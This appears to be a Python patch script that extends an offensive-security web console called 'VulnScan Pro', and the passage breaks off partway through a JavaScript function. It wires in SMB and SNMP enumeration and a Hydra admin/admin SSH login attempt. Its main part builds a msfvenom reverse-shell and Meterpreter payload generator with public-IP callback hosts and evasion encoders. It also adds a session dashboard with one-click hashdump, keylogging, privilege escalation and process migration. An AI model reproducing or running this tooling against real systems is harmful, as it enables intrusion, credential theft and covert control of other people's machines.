#!/usr/bin/env python3
"""
VulnScan Pro — Mega Patch v4
============================
Fixes and enhancements:
  1. Legion — smb/smbclient/snmp/hydra properly wired
  2. SearchSploit — formatted table output (not raw text)
  3. SecLists — show first 50 + "Copy All Paths" button
  4. msfvenom — auto-select options by payload, public IP as LHOST,
                one-liner agent command after generation,
                MSF dashboard with connected sessions + shell
  5. Netcat — show "command to run on other side" based on mode
  6. Socat — show "command to run on other side" based on config

Run from project root:
    python3 patch_v4.py
"""
import os, shutil
from datetime import datetime

GREEN  = "\033[92m"; RED    = "\033[91m"; YELLOW = "\033[93m"
CYAN   = "\033[96m"; RESET  = "\033[0m";  BOLD   = "\033[1m"

def ok(m):   print(f"  {GREEN}✓{RESET}  {m}")
def fail(m): print(f"  {RED}✗{RESET}  {m}")
def info(m): print(f"  {CYAN}→{RESET}  {m}")
def skip(m): print(f"  \033[2m·{RESET}  {m}")

def backup(path):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    bak = f"{path}.{ts}.bak"
    shutil.copy2(path, bak)
    return bak

def patch(path, label, old, new):
    if not os.path.isfile(path):
        fail(f"{label} — file not found: {path}"); return False
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        src = f.read()
    if old not in src:
        skip(f"{label} — anchor not found (may already be patched)"); return False
    bak = backup(path)
    with open(path, "w", encoding="utf-8") as f:
        f.write(src.replace(old, new, 1))
    ok(f"{label}  [backup: {bak}]")
    return True

SERVER = "api_server.py"

print()
print(BOLD + CYAN + "╔══════════════════════════════════════════════════════╗" + RESET)
print(BOLD + CYAN + "║  VulnScan Pro — Mega Patch v4                        ║" + RESET)
print(BOLD + CYAN + "║  Legion/SearchSploit/SecLists/msfvenom/NC/Socat      ║" + RESET)
print(BOLD + CYAN + "╚══════════════════════════════════════════════════════╝" + RESET)
print()

# ══════════════════════════════════════════════════════════════
# PATCH 1 — Legion: wire smb/smbclient/snmp/hydra properly
# ══════════════════════════════════════════════════════════════

OLD_LEGION_ROUTE = '''            else:
                # Other tools through proxychains
                proc = subprocess.run(
                    [px, "-q", binary, target],
                    capture_output=True, text=True, timeout=180
                )
                if proc.stdout.strip():
                    findings.append({"title": f"{mod} output", "detail": proc.stdout[:500]})'''

NEW_LEGION_ROUTE = '''            elif mod in ("smb", "smbclient"):
                # SMB enumeration via smbclient or enum4linux
                smb_bin = shutil.which("smbclient") or shutil.which("enum4linux")
                if smb_bin:
                    if "enum4linux" in (smb_bin or ""):
                        smb_cmd = [px, "-q", smb_bin, "-a", target]
                    else:
                        smb_cmd = [smb_bin, "-L", f"\\\\{target}\\\\", "-N", "--timeout=10"]
                    try:
                        proc = subprocess.run(smb_cmd, capture_output=True, text=True, timeout=120)
                        out = (proc.stdout or "") + (proc.stderr or "")
                        for line in out.splitlines():
                            if any(kw in line for kw in ["Sharename", "WORKGROUP", "Domain", "IPC$", "ADMIN$", "Error", "session"]):
                                findings.append({"title": f"SMB: {line.strip()[:80]}", "detail": ""})
                                total_issues += 1
                    except Exception as e:
                        findings.append({"title": f"SMB error", "detail": str(e)})
                else:
                    findings.append({"title": "smbclient/enum4linux not installed", "detail": "sudo apt install smbclient"})

            elif mod == "snmp":
                # SNMP enumeration
                snmp_bin = shutil.which("snmpwalk") or shutil.which("snmp-check")
                if snmp_bin:
                    try:
                        snmp_cmd = [snmp_bin, "-v", "2c", "-c", "public", target] if "snmpwalk" in snmp_bin else [snmp_bin, "-t", target]
                        proc = subprocess.run(snmp_cmd, capture_output=True, text=True, timeout=60)
                        out = (proc.stdout or "") + (proc.stderr or "")
                        if out.strip():
                            lines = [l for l in out.splitlines() if l.strip()][:20]
                            for l in lines:
                                findings.append({"title": f"SNMP: {l[:80]}", "detail": ""})
                                total_issues += 1
                        else:
                            findings.append({"title": "SNMP: no response (community 'public')", "detail": ""})
                    except Exception as e:
                        findings.append({"title": "SNMP error", "detail": str(e)})
                else:
                    findings.append({"title": "snmpwalk not installed", "detail": "sudo apt install snmp"})

            elif mod == "hydra":
                # Hydra credential test (ssh default creds only — safe demo)
                hydra_bin = shutil.which("hydra") or shutil.which("thc-hydra")
                if hydra_bin:
                    try:
                        cmd = [
                            hydra_bin, "-l", "admin", "-p", "admin",
                            "-t", "4", "-f", f"ssh://{target}"
                        ]
                        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                        out = (proc.stdout or "") + (proc.stderr or "")
                        for line in out.splitlines():
                            if "login:" in line.lower() or "password:" in line.lower():
                                findings.append({"title": f"Hydra: {line.strip()[:80]}", "detail": ""})
                                total_issues += 1
                        if not findings:
                            findings.append({"title": "Hydra: no default creds found (admin/admin on SSH)", "detail": ""})
                    except Exception as e:
                        findings.append({"title": "Hydra error", "detail": str(e)})
                else:
                    findings.append({"title": "hydra not installed", "detail": "sudo apt install hydra"})

            else:
                # Generic passthrough
                try:
                    proc = subprocess.run(
                        [px, "-q", binary, target],
                        capture_output=True, text=True, timeout=180
                    )
                    if proc.stdout.strip():
                        findings.append({"title": f"{mod} output", "detail": proc.stdout[:500]})
                except Exception as e:
                    findings.append({"title": f"{mod} error", "detail": str(e)})'''

patch(SERVER, "Legion: smb/snmp/hydra support", OLD_LEGION_ROUTE, NEW_LEGION_ROUTE)

# ══════════════════════════════════════════════════════════════
# PATCH 2 — SearchSploit: formatted output
# ══════════════════════════════════════════════════════════════

OLD_SEARCHSPLOIT_RES = '''    else{t.log('Search complete','s');
      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||'No exploits found.')+'</pre></div>');}
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='SEARCH EXPLOIT-DB';}
}'''

NEW_SEARCHSPLOIT_RES = '''    else{t.log('Search complete','s');
      var rawOut=(d.stdout||'No exploits found.');
      // Parse searchsploit table output into structured rows
      var exploits=[];
      var lines=rawOut.split('\\n');
      var inTable=false;
      lines.forEach(function(line){
        if(line.indexOf('---')>=0&&line.indexOf('|')>=0){inTable=true;return;}
        if(!inTable)return;
        if(!line.trim()||line.indexOf('|')<0)return;
        var parts=line.split('|');
        if(parts.length>=2){
          var title=(parts[0]||'').trim();
          var path=(parts[1]||'').trim();
          if(title&&path&&title.toLowerCase()!=='title'){
            var type='exploit';
            if(/dos/i.test(title))type='dos';
            else if(/shellcode/i.test(title))type='shellcode';
            else if(/local/i.test(title))type='local';
            else if(/remote/i.test(title)||/rce/i.test(title))type='remote';
            else if(/webapps/i.test(path))type='webapp';
            exploits.push({title:title,path:path,type:type});
          }
        }
      });
      var html='';
      if(exploits.length>0){
        html+='<div class="stats" style="margin-bottom:12px">'
          +'<div class="stat"><div class="stat-val" style="color:var(--red)">'+exploits.length+'</div><div class="stat-lbl">EXPLOITS FOUND</div></div>'
          +'<div class="stat"><div class="stat-val">'+exploits.filter(function(e){return e.type==='remote';}).length+'</div><div class="stat-lbl">REMOTE</div></div>'
          +'<div class="stat"><div class="stat-val">'+exploits.filter(function(e){return e.type==='local';}).length+'</div><div class="stat-lbl">LOCAL</div></div>'
          +'<div class="stat"><div class="stat-val">'+exploits.filter(function(e){return e.type==='webapp';}).length+'</div><div class="stat-lbl">WEB</div></div>'
          +'</div>';
        html+='<div class="card" style="margin-bottom:10px"><div class="card-header"><div class="card-title">Exploit Database Results ('+exploits.length+')</div></div>'
          +'<div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>TYPE</th><th>TITLE</th><th>PATH</th><th>ACTION</th></tr></thead><tbody>';
        var typeColors={remote:'var(--red)',local:'var(--orange)',webapp:'var(--yellow)',dos:'var(--text3)',shellcode:'var(--purple)',exploit:'var(--blue)'};
        exploits.forEach(function(ex,i){
          var col=typeColors[ex.type]||'var(--text3)';
          html+='<tr>'
            +'<td style="color:var(--text3);font-family:var(--mono)">'+(i+1)+'</td>'
            +'<td><span style="font-family:var(--mono);font-size:10px;color:'+col+'">'+ex.type.toUpperCase()+'</span></td>'
            +'<td style="font-size:12px">'+ex.title+'</td>'
            +'<td style="font-family:var(--mono);font-size:10px;color:var(--text3)">'+ex.path+'</td>'
            +'<td><button class="btn btn-ghost btn-sm" onclick="ssViewExploit(\''+ex.path.replace(/\'/g,"\\'")+'\')" title="View exploit">VIEW</button>'
            +' <button class="btn btn-ghost btn-sm" onclick="navigator.clipboard&&navigator.clipboard.writeText(\'searchsploit -m \'+\''+ex.path.replace(/\'/g,"\\'")+'\')">COPY</button></td>'
            +'</tr>';
        });
        html+='</tbody></table></div></div>';
      } else {
        html='<div class="card card-p"><div class="card-title" style="margin-bottom:8px">Raw Output</div><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+rawOut+'</pre></div>';
      }
      t.res(html);}
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='SEARCH EXPLOIT-DB';}
}

async function ssViewExploit(path){
  var t=mkTool('searchsploit');t.start();t.log('Reading: '+path,'i');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({tool:'searchsploit',operation:'custom',args:'-x "'+path.replace(/"/g,'')+'"',timeout:15})},20000,'searchsploit');
    var d=await r.json();t.end();
    t.res('<div class="card card-p"><div class="card-title" style="margin-bottom:8px">'+path+'</div><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2);max-height:400px;overflow-y:auto">'+(d.stdout||'(empty)')+'</pre></div>');
  }catch(e){t.end();t.err(e.message);}
}'''

patch(SERVER, "SearchSploit: formatted table output", OLD_SEARCHSPLOIT_RES, NEW_SEARCHSPLOIT_RES)

# ══════════════════════════════════════════════════════════════
# PATCH 3 — SecLists: copy-all button & path list
# ══════════════════════════════════════════════════════════════

OLD_SECLISTS_RES = '''    else{
      var words=d.words||[];
      if(grep){var re=new RegExp(grep,'i');words=words.filter(function(w){return re.test(w);});}
      t.log('Loaded '+d.total_loaded+' entries (showing '+words.length+')','s');
      t.res('<div class="card card-p"><div class="card-title" style="margin-bottom:6px">'+d.filename+' ('+d.total_loaded+' entries)</div><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+words.join('\\n')+'</pre></div>');
    }'''

NEW_SECLISTS_RES = '''    else{
      var words=d.words||[];
      if(grep){var re=new RegExp(grep,'i');words=words.filter(function(w){return re.test(w);});}
      t.log('Loaded '+d.total_loaded+' entries (showing '+words.length+')','s');
      var allWords=words.join('\\n');
      t.res(
        '<div class="card card-p">'
        +'<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;flex-wrap:wrap;gap:6px">'
        +'<div class="card-title">'+d.filename+' <span style="color:var(--text3);font-size:11px">('+d.total_loaded+' total entries, showing first '+words.length+')</span></div>'
        +'<div style="display:flex;gap:6px;flex-wrap:wrap">'
        +'<button class="btn btn-outline btn-sm" onclick="navigator.clipboard&&navigator.clipboard.writeText('+JSON.stringify(allWords)+').then(function(){showToast(\'Copied\',\''+words.length+' entries copied to clipboard\',\'success\',2500)})">COPY SHOWN</button>'
        +'<button class="btn btn-outline btn-sm" onclick="seclistsCopyAllFull('+JSON.stringify(d.path)+','+d.total_loaded+')">COPY ALL ('+d.total_loaded+')</button>'
        +'<button class="btn btn-outline btn-sm" onclick="seclistsDownload('+JSON.stringify(allWords)+','+JSON.stringify(d.filename)+')">DOWNLOAD</button>'
        +'</div></div>'
        +'<pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2);max-height:400px;overflow-y:auto;border:1px solid var(--border);border-radius:4px;padding:8px">'+words.join('\\n')+'</pre>'
        +'</div>'
      );
    }'''

patch(SERVER, "SecLists: copy-all button", OLD_SECLISTS_RES, NEW_SECLISTS_RES)

# Add helper functions for seclists
OLD_SECLISTS_COPY = '''function seclistsCopy(){
  var path=document.getElementById('seclists-path').value.trim();
  if(path){
    try{navigator.clipboard.writeText(path).then(function(){showToast('Copied','Path copied to clipboard','success',2000);});}
    catch(e){showToast('Path',path,'info',4000);}
  }
}'''

NEW_SECLISTS_COPY = '''function seclistsCopy(){
  var path=document.getElementById('seclists-path').value.trim();
  if(path){
    try{navigator.clipboard.writeText(path).then(function(){showToast('Copied','Path copied to clipboard','success',2000);});}
    catch(e){showToast('Path',path,'info',4000);}
  }
}
async function seclistsCopyAllFull(path,total){
  showToast('Loading...','Fetching all '+total+' entries...','info',3000);
  try{
    var r=await fetch('/api/wordlist?path='+encodeURIComponent(path)+'&limit='+Math.min(total,50000));
    var d=await r.json();
    if(d.error){showToast('Error',d.error,'error',3000);return;}
    var text=(d.words||[]).join('\\n');
    await navigator.clipboard.writeText(text);
    showToast('Copied!',d.words.length+' entries copied to clipboard','success',3000);
  }catch(e){showToast('Error',e.message,'error',3000);}
}
function seclistsDownload(content,filename){
  var blob=new Blob([content],{type:'text/plain'});
  var url=URL.createObjectURL(blob);
  var a=document.createElement('a');a.href=url;a.download=filename;
  document.body.appendChild(a);a.click();document.body.removeChild(a);URL.revokeObjectURL(url);
}'''

patch(SERVER, "SecLists: copy-all helpers", OLD_SECLISTS_COPY, NEW_SECLISTS_COPY)

# ══════════════════════════════════════════════════════════════
# PATCH 4 — msfvenom: public IP as LHOST, auto-options,
#           one-liner stager, MSF session dashboard + shell
# ══════════════════════════════════════════════════════════════

OLD_MSFVENOM_PAGE = '''      <!-- MSFVENOM -->
      <div class="page" id="page-msfvenom">
        <div class="page-hd"><div class="page-title">msfvenom</div><div class="page-desc">Metasploit payload generator and encoder</div></div>
        <div class="notice">&#9888; Authorized use only. Only run msfvenom on systems you own or have explicit written permission to test.</div>
        <div class="card card-p" style="margin-bottom:14px">
          <div class="row2" style="margin-bottom:12px">
            <div class="fg"><label>PAYLOAD</label>
              <select class="inp inp-mono" id="msfvenom-payload">
                <option value="windows/x64/meterpreter/reverse_tcp" selected>Windows x64 Meterpreter/TCP</option>
                <option value="windows/meterpreter/reverse_tcp">Windows x86 Meterpreter/TCP</option>
                <option value="windows/x64/shell_reverse_tcp">Windows x64 Shell/TCP</option>
                <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter/TCP</option>
                <option value="linux/x64/shell_reverse_tcp">Linux x64 Shell/TCP</option>
                <option value="php/meterpreter/reverse_tcp">PHP Meterpreter/TCP</option>
                <option value="python/meterpreter/reverse_tcp">Python Meterpreter/TCP</option>
                <option value="cmd/unix/reverse_bash">Unix CMD Reverse Bash</option>
                <option value="custom">Custom (enter below)</option>
              </select>
            </div>
            <div class="fg"><label>CUSTOM PAYLOAD (if Custom selected)</label><input class="inp inp-mono" id="msfvenom-custom-payload" type="text" placeholder="windows/x64/meterpreter_reverse_https"/></div>
          </div>
          <div class="row3" style="margin-bottom:12px">
            <div class="fg"><label>LHOST (your IP)</label><input class="inp inp-mono" id="msfvenom-lhost" type="text" placeholder="192.168.1.100"/></div>
            <div class="fg"><label>LPORT</label><input class="inp inp-mono" id="msfvenom-lport" type="number" value="4444" min="1" max="65535"/></div>
            <div class="fg"><label>FORMAT (-f)</label>
              <select class="inp inp-mono" id="msfvenom-format">
                <option value="exe" selected>exe</option><option value="elf">elf</option>
                <option value="asp">asp</option><option value="aspx">aspx</option>
                <option value="php">php</option><option value="py">py</option>
                <option value="raw">raw</option><option value="powershell">powershell</option>
              </select>
            </div>
          </div>
          <div class="row3" style="margin-bottom:12px">
            <div class="fg"><label>ENCODER (optional)</label>
              <select class="inp inp-mono" id="msfvenom-encoder">
                <option value="">None</option>
                <option value="x86/shikata_ga_nai">x86/shikata_ga_nai</option>
                <option value="x64/xor_dynamic">x64/xor_dynamic</option>
              </select>
            </div>
            <div class="fg"><label>ITERATIONS</label><input class="inp inp-mono" id="msfvenom-iterations" type="number" value="1" min="1" max="10"/></div>
            <div class="fg"><label>TIMEOUT (sec)</label><input class="inp inp-mono" id="msfvenom-timeout" type="number" value="60" min="10" max="300"/></div>
          </div>
          <div class="fg" style="margin-bottom:12px"><label>EXTRA OPTIONS</label><input class="inp inp-mono" id="msfvenom-extra" type="text" placeholder="EXITFUNC=thread"/></div>
          <button class="btn btn-primary" id="msfvenom-btn" onclick="runMsfvenom()">GENERATE PAYLOAD</button>
        </div>
        <div class="progress-wrap" id="msfvenom-prog"><div class="progress-bar" id="msfvenom-pb" style="width:0%"></div></div>
        <div class="terminal" id="msfvenom-term"></div>
        <div class="err-box" id="msfvenom-err"></div>
        <div id="msfvenom-res"></div>
        <div class="card card-p" style="margin-top:10px">
          <div class="card-title" style="margin-bottom:8px">Quick Install</div>
          <div style="font-family:var(--mono);font-size:11px;color:var(--text2)">sudo apt install metasploit-framework</div>
          <div style="margin-top:8px;display:flex;flex-wrap:wrap;gap:5px"><span class="tag">exploit</span><span class="tag">msfvenom</span></div>
        </div>
      </div>'''

NEW_MSFVENOM_PAGE = '''      <!-- MSFVENOM -->
      <div class="page" id="page-msfvenom">
        <div class="page-hd"><div class="page-title">msfvenom</div><div class="page-desc">Metasploit payload generator · auto-handler · live session dashboard</div></div>
        <div class="notice">&#9888; Authorized use only. Only run msfvenom on systems you own or have explicit written permission to test.</div>

        <!-- Payload Builder -->
        <div class="card card-p" style="margin-bottom:14px">
          <div class="card-title" style="margin-bottom:12px">Payload Builder</div>
          <div class="row2" style="margin-bottom:10px">
            <div class="fg"><label>PAYLOAD</label>
              <select class="inp inp-mono" id="msfvenom-payload" onchange="msfAutoConfig()">
                <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter/TCP</option>
                <option value="windows/meterpreter/reverse_tcp">Windows x86 Meterpreter/TCP</option>
                <option value="windows/x64/meterpreter/reverse_https">Windows x64 Meterpreter/HTTPS</option>
                <option value="windows/x64/shell_reverse_tcp">Windows x64 Shell/TCP</option>
                <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter/TCP</option>
                <option value="linux/x64/shell_reverse_tcp">Linux x64 Shell/TCP</option>
                <option value="linux/x86/meterpreter/reverse_tcp">Linux x86 Meterpreter/TCP</option>
                <option value="osx/x64/meterpreter_reverse_tcp">macOS x64 Meterpreter/TCP</option>
                <option value="php/meterpreter/reverse_tcp">PHP Meterpreter/TCP</option>
                <option value="php/reverse_php">PHP Reverse Shell</option>
                <option value="python/meterpreter/reverse_tcp">Python Meterpreter/TCP</option>
                <option value="cmd/unix/reverse_bash">Unix CMD Reverse Bash</option>
                <option value="java/meterpreter/reverse_tcp">Java Meterpreter/TCP</option>
                <option value="android/meterpreter/reverse_tcp">Android Meterpreter/TCP</option>
                <option value="custom">Custom (enter below)</option>
              </select>
            </div>
            <div class="fg"><label>CUSTOM PAYLOAD (if Custom selected)</label><input class="inp inp-mono" id="msfvenom-custom-payload" type="text" placeholder="windows/x64/meterpreter_reverse_https"/></div>
          </div>
          <div class="row3" style="margin-bottom:10px">
            <div class="fg">
              <label style="display:flex;align-items:center;justify-content:space-between">
                LHOST (your IP)
                <button class="btn btn-ghost btn-sm" onclick="msfFetchPublicIP()" style="font-size:10px;padding:2px 6px">AUTO-DETECT &#8635;</button>
              </label>
              <input class="inp inp-mono" id="msfvenom-lhost" type="text" placeholder="Detecting public IP..."/>
            </div>
            <div class="fg"><label>LPORT</label><input class="inp inp-mono" id="msfvenom-lport" type="number" value="4444" min="1" max="65535"/></div>
            <div class="fg"><label>FORMAT (-f) <span id="msf-format-hint" style="color:var(--text3);font-size:10px"></span></label>
              <select class="inp inp-mono" id="msfvenom-format">
                <option value="exe">exe (Windows)</option>
                <option value="elf">elf (Linux)</option>
                <option value="macho">macho (macOS)</option>
                <option value="asp">asp</option><option value="aspx">aspx</option>
                <option value="php">php</option><option value="py">py</option>
                <option value="rb">rb (Ruby)</option>
                <option value="raw">raw</option>
                <option value="powershell">powershell (ps1)</option>
                <option value="apk">apk (Android)</option>
                <option value="jar">jar (Java)</option>
                <option value="sh">sh (bash script)</option>
              </select>
            </div>
          </div>
          <div class="row3" style="margin-bottom:10px">
            <div class="fg"><label>ENCODER (optional)</label>
              <select class="inp inp-mono" id="msfvenom-encoder">
                <option value="">None</option>
                <option value="x86/shikata_ga_nai">x86/shikata_ga_nai (best x86)</option>
                <option value="x64/xor_dynamic">x64/xor_dynamic</option>
                <option value="x86/countdown">x86/countdown</option>
                <option value="x86/jmp_call_additive">x86/jmp_call_additive</option>
              </select>
            </div>
            <div class="fg"><label>ITERATIONS</label><input class="inp inp-mono" id="msfvenom-iterations" type="number" value="1" min="1" max="10"/></div>
            <div class="fg"><label>TIMEOUT (sec)</label><input class="inp inp-mono" id="msfvenom-timeout" type="number" value="60" min="10" max="300"/></div>
          </div>
          <div class="fg" style="margin-bottom:12px"><label>EXTRA OPTIONS</label><input class="inp inp-mono" id="msfvenom-extra" type="text" placeholder="EXITFUNC=thread"/></div>
          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button class="btn btn-primary" id="msfvenom-btn" onclick="runMsfvenom()">GENERATE PAYLOAD</button>
            <button class="btn btn-outline btn-sm" onclick="msfAutoConfig()">AUTO-CONFIG &#9881;</button>
          </div>
        </div>

        <div class="progress-wrap" id="msfvenom-prog"><div class="progress-bar" id="msfvenom-pb" style="width:0%"></div></div>
        <div class="terminal" id="msfvenom-term"></div>
        <div class="err-box" id="msfvenom-err"></div>
        <div id="msfvenom-res"></div>

        <!-- MSF Session Dashboard -->
        <div class="card card-p" style="margin-top:14px">
          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
            <div>
              <div class="card-title">MSF Session Dashboard</div>
              <div style="font-size:11px;color:var(--text3);margin-top:2px">Connected meterpreter / shell sessions</div>
            </div>
            <div style="display:flex;gap:8px">
              <button class="btn btn-outline btn-sm" id="msf-handler-btn" onclick="msfStartHandler()">&#9654; START HANDLER</button>
              <button class="btn btn-outline btn-sm" onclick="msfRefreshSessions()">REFRESH &#8635;</button>
            </div>
          </div>
          <div id="msf-handler-status" style="font-size:11px;color:var(--text3);margin-bottom:10px">Handler not started. Click "START HANDLER" to begin listening for incoming connections.</div>
          <div id="msf-sessions">
            <div style="color:var(--text3);font-size:12px;padding:12px;border:1px dashed var(--border);border-radius:6px;text-align:center">
              No active sessions. Generate a payload, start the handler, then run the payload on the target system.
            </div>
          </div>
        </div>

        <!-- Active Shell -->
        <div class="card" id="msf-shell-card" style="margin-top:12px;display:none">
          <div class="card-header">
            <div>
              <div class="card-title">&#128187; Remote Shell — <span id="msf-shell-session-label" style="color:var(--green)">Session #1</span></div>
              <div style="font-size:10px;color:var(--text3);margin-top:2px">Type commands and press Enter or click SEND</div>
            </div>
            <button class="btn btn-danger btn-sm" onclick="msfCloseShell()">CLOSE SESSION</button>
          </div>
          <div id="msf-shell-output"
               style="background:#050507;color:#00e5ff;font-family:var(--mono);font-size:12px;
                      line-height:1.7;padding:14px;min-height:280px;max-height:420px;
                      overflow-y:auto;white-space:pre-wrap;border-bottom:1px solid var(--border)">
            <span style="color:var(--text3)">[*] Session opened — type commands below</span>\n
          </div>
          <div style="display:flex;align-items:center;gap:8px;padding:10px 14px;background:var(--bg2)">
            <span style="font-family:var(--mono);font-size:12px;color:var(--green);flex-shrink:0">meterpreter &gt;</span>
            <input id="msf-shell-input" class="inp inp-mono" type="text"
                   placeholder="sysinfo, getuid, shell, download file.txt, upload /tmp/tool ..."
                   style="flex:1;background:transparent;border:none;box-shadow:none;padding:4px 0"
                   onkeydown="msfShellKey(event)" autocomplete="off" spellcheck="false"/>
            <button class="btn btn-primary btn-sm" onclick="msfShellSend()">SEND</button>
          </div>
          <div style="padding:8px 14px;background:var(--bg2);border-top:1px solid var(--border);display:flex;flex-wrap:wrap;gap:5px">
            <span style="font-size:10px;color:var(--text3);font-family:var(--mono);margin-right:4px">QUICK:</span>
            <button class="btn btn-ghost btn-sm" onclick="msfShellQuick('sysinfo')" style="font-size:10px">sysinfo</button>
            <button class="btn btn-ghost btn-sm" onclick="msfShellQuick('getuid')" style="font-size:10px">getuid</button>
            <button class="btn btn-ghost btn-sm" onclick="msfShellQuick('getpid')" style="font-size:10px">getpid</button>
            <button class="btn btn-ghost btn-sm" onclick="msfShellQuick('ps')" style="font-size:10px">ps</button>
            <button class="btn btn-ghost btn-sm" onclick="msfShellQuick('shell')" style="font-size:10px">shell</button>
            <button class="btn btn-ghost btn-sm" onclick="msfShellQuick('hashdump')" style="font-size:10px">hashdump</button>
            <button class="btn btn-ghost btn-sm" onclick="msfShellQuick('migrate -N explorer.exe')" style="font-size:10px">migrate</button>
            <button class="btn btn-ghost btn-sm" onclick="msfShellQuick('getsystem')" style="font-size:10px">getsystem</button>
            <button class="btn btn-ghost btn-sm" onclick="msfShellQuick('keyscan_start')" style="font-size:10px">keyscan</button>
            <button class="btn btn-ghost btn-sm" onclick="msfShellQuick('screenshot')" style="font-size:10px">screenshot</button>
            <button class="btn btn-ghost btn-sm" onclick="msfShellQuick('exit')" style="font-size:10px;color:var(--red)">exit</button>
          </div>
        </div>

      </div>'''

patch(SERVER, "msfvenom: full page redesign with dashboard", OLD_MSFVENOM_PAGE, NEW_MSFVENOM_PAGE)

# ══════════════════════════════════════════════════════════════
# PATCH 5 — msfvenom JS: auto-config, public IP, stager, dashboard
# ══════════════════════════════════════════════════════════════

OLD_MSF_JS = '''/* msfvenom */
async function runMsfvenom(){
  var payloadSel=document.getElementById('msfvenom-payload').value;
  var customP=document.getElementById('msfvenom-custom-payload').value.trim();
  var payload=payloadSel==='custom'?customP:payloadSel;
  if(!payload){alert('Select or enter a payload');return;}
  var lhost=document.getElementById('msfvenom-lhost').value.trim();
  var lport=document.getElementById('msfvenom-lport').value||'4444';
  var format=document.getElementById('msfvenom-format').value||'exe';
  var encoder=document.getElementById('msfvenom-encoder').value||'';
  var iterations=document.getElementById('msfvenom-iterations').value||'1';
  var extra=document.getElementById('msfvenom-extra').value.trim();
  var timeout=parseInt(document.getElementById('msfvenom-timeout').value||'60',10);
  var args='-p '+payload;
  if(lhost)args+=' LHOST='+lhost;
  args+=' LPORT='+lport+' -f '+format;
  if(encoder)args+=' -e '+encoder+' -i '+iterations;
  if(extra)args+=' '+extra;
  args+=' --platform auto';
  var btn=document.getElementById('msfvenom-btn');
  btn.disabled=true;btn.innerHTML='<span class="spin"></span> Generating...';
  var t=mkTool('msfvenom');t.start();t.log('msfvenom -p '+payload,'i');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'msfvenom',operation:'custom',args:args,timeout:timeout})},Math.max(30000,timeout*1000+5000),'msfvenom');
    var d=await r.json();t.end();
    if(d.error){t.err(d.error);}
    else{t.log('Payload generated (exit '+d.exit_code+')','s');
      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||d.stderr||'Done')+'</pre></div>');}
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='GENERATE PAYLOAD';}
}'''

NEW_MSF_JS = '''/* msfvenom */
var _msfHandlerPID=null;
var _msfSessions={};
var _msfActiveSession=null;
var _msfShellHistory=[];
var _msfShellHistIdx=-1;
var _msfSessionPollTimer=null;

// Auto-detect public IP on page load
async function msfFetchPublicIP(){
  var el=document.getElementById('msfvenom-lhost');
  if(!el)return;
  el.placeholder='Detecting...';
  try{
    // Try to get public IP via server-side helper
    var r=await fetch('/api/public-ip');
    var d=await r.json();
    if(d.ip&&!d.error){
      el.value=d.ip;
      showToast('LHOST set','Public IP: '+d.ip,'success',2500);
    }
  }catch(e){
    // Fallback: leave blank
    el.placeholder='192.168.1.x — enter manually';
  }
}

// Auto-configure format/encoder based on payload
function msfAutoConfig(){
  var payloadSel=document.getElementById('msfvenom-payload');
  var formatSel=document.getElementById('msfvenom-format');
  var encoderSel=document.getElementById('msfvenom-encoder');
  var portEl=document.getElementById('msfvenom-lport');
  var hintEl=document.getElementById('msf-format-hint');
  if(!payloadSel||!formatSel)return;
  var p=payloadSel.value;
  // Format auto-selection
  if(p.startsWith('windows/'))          {formatSel.value='exe';if(hintEl)hintEl.textContent='→ exe';}
  else if(p.startsWith('linux/'))       {formatSel.value='elf';if(hintEl)hintEl.textContent='→ elf';}
  else if(p.startsWith('osx/'))         {formatSel.value='macho';if(hintEl)hintEl.textContent='→ macho';}
  else if(p.startsWith('php/'))         {formatSel.value='php';if(hintEl)hintEl.textContent='→ php';}
  else if(p.startsWith('python/'))      {formatSel.value='py';if(hintEl)hintEl.textContent='→ py';}
  else if(p.startsWith('cmd/unix'))     {formatSel.value='sh';if(hintEl)hintEl.textContent='→ sh';}
  else if(p.startsWith('android/'))     {formatSel.value='apk';if(hintEl)hintEl.textContent='→ apk';}
  else if(p.startsWith('java/'))        {formatSel.value='jar';if(hintEl)hintEl.textContent='→ jar';}
  else if(p.indexOf('powershell')>=0)   {formatSel.value='powershell';if(hintEl)hintEl.textContent='→ ps1';}
  // Encoder auto-selection
  if(encoderSel){
    if(p.startsWith('windows/x64/'))    encoderSel.value='x64/xor_dynamic';
    else if(p.startsWith('windows/'))   encoderSel.value='x86/shikata_ga_nai';
    else                                encoderSel.value='';
  }
  // Port hints
  if(portEl){
    if(p.indexOf('https')>=0)           portEl.value='443';
    else if(p.indexOf('http')>=0)       portEl.value='80';
    else if(p.indexOf('dns')>=0)        portEl.value='53';
    else                                portEl.value='4444';
  }
}

async function runMsfvenom(){
  var payloadSel=document.getElementById('msfvenom-payload').value;
  var customP=document.getElementById('msfvenom-custom-payload').value.trim();
  var payload=payloadSel==='custom'?customP:payloadSel;
  if(!payload){alert('Select or enter a payload');return;}
  var lhost=document.getElementById('msfvenom-lhost').value.trim();
  var lport=document.getElementById('msfvenom-lport').value||'4444';
  var format=document.getElementById('msfvenom-format').value||'exe';
